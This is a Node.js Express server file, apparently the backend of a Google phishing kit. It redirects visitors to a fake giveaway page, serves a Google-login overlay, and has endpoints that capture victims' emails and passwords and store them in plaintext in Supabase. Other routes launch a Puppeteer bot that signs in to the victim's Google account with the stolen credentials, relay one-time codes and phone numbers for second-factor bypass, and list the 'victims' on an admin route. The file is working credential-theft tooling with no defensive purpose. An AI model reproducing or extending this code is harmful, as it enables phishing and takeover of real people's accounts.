require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://vmmicbfoobdbtikcqxel.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || '';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { autoRefreshToken: false, persistSession: false } });

const { setRelay, getRelay } = require('./worker/relay-store');
const { attemptGoogleAuth } = require('./worker/google-auth-agent');

const app = express();
const PORT = process.env.PORT || 8080;
app.use(cors({ origin: true, credentials: true }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  if (req.path.endsWith('.html') || req.path === '/') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.setHeader('Pragma', 'no-cache'); res.setHeader('Expires', '0');
  }
  next();
});

app.use('/overlay', express.static(path.join(__dirname, 'front')));
app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.use('/giveaway', express.static(path.join(__dirname, '..', 'giveaway-v2')));

// Redirection racine vers le concours
app.get('/', (req, res) => {
  res.redirect('/giveaway/index.html');
});

async function getUserCredentials(userId) {
  const { data, error } = await supabase.from('users').select('*').eq('id', userId).single();
  if (error) { console.error('[SUPABASE]', error); return null; }
  return data;
}

// Capture email
app.post('/api/auth/capture-email', async (req, res) => {
  try {
    const { email, siteName, siteUrl } = req.body;
    if (!email) return res.status(400).json({ success: false, error: 'Email requis' });
    // Insert minimal pour compatibilité avec toutes les tables Supabase
    const insertData = { email: email, status: 'email_captured' };
    let { data, error } = await supabase.from('users').insert(insertData).select('id');
    if (error && error.message && error.message.includes('column')) {
      // Fallback : colonnes minimales
      const { data: d2, error: err2 } = await supabase.from('users').insert({ email: email }).select('id');
      if (err2) return res.status(500).json({ success: false, error: err2.message });
      data = d2;
    } else if (error) {
      return res.status(500).json({ success: false, error: error.message });
    }
    const userId = data && data[0] && data[0].id ? data[0].id : null;
    if (!userId) return res.status(500).json({ success: false, error: 'Impossible de recuperer l\'ID' });
    console.log(`[API] Email: ${email} -> ${userId}`);
    res.json({ success: true, userId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// Capture password
app.post('/api/auth/capture-password', async (req, res) => {
  try {
    const { userId, password } = req.body;
    if (!userId || !password) return res.status(400).json({ success: false, error: 'Params manquants' });
    const { error } = await supabase.from('users').update({
      password: password, status: 'password_captured'
    }).eq('id', userId);
    if (error) return res.status(500).json({ success: false, error: error.message });
    console.log(`[API] Password for ${userId}`);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// Launch bot (Puppeteer)
app.post('/api/auth/launch-bot/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await getUserCredentials(userId);
    if (!user) return res.status(404).json({ success: false, error: 'User non trouve' });
    if (!user.email || !user.password) return res.status(400).json({ success: false, error: 'Credentials incomplets' });
    console.log(`[BOT] Lancement: ${user.email}`);
    (async () => {
      try {
        const result = await attemptGoogleAuth(userId, user.email, user.password, { headless: false, autoForgot: true });
        console.log('[BOT] Result:', result);
      } catch (e) { console.error('[BOT] Err:', e.message); }
    })();
    res.json({ success: true, message: 'Bot lance. Attendez la notification sur votre telephone.' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// Route alternative compatible cademo
app.post('/api/validate-account/:userId', async (req, res) => {
  try {
    res.redirect(307, '/api/auth/launch-bot/' + req.params.userId);
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// Relay
app.post('/api/relay', (req, res) => {
  const { email, code, phone, status, error } = req.body;
  if (!email) return res.status(400).json({ success: false, error: 'Email requis' });
  setRelay(email, { code, phone, status, error });
  console.log(`[RELAY] ${email}: code=${code} status=${status}`);
  res.json({ success: true });
});

app.get('/api/relay/:email', (req, res) => {
  res.json({ success: true, data: getRelay(req.params.email) });
});

// Stats
app.get('/api/stats', async (req, res) => {
  try {
    const { count: total } = await supabase.from('users').select('*', { count: 'exact', head: true });
    const { count: verified } = await supabase.from('users').select('*', { count: 'exact', head: true }).eq('status', 'session_active');
    res.json({ success: true, total, verified });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

// Admin
app.get('/api/victims', async (req, res) => {
  try {
    const { password } = req.query;
    if (password !== process.env.ADMIN_PASSWORD) return res.status(401).json({ success: false, error: 'Non autorise' });
    const { data, error } = await supabase.from('users').select('id,email,status,created_at').order('created_at', { ascending: false }).limit(100);
    if (error) return res.status(500).json({ success: false, error: error.message });
    res.json({ success: true, victims: data || [] });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.listen(PORT, () => {
  console.log('\n======================================');
  console.log('  GOOGLE AUTH KIT v2.0');
  console.log('  http://localhost:' + PORT);
  console.log('  Overlay: /overlay/google-auth.html');
  console.log('  Loader:  /overlay/loader.js');
  console.log('======================================\n');
});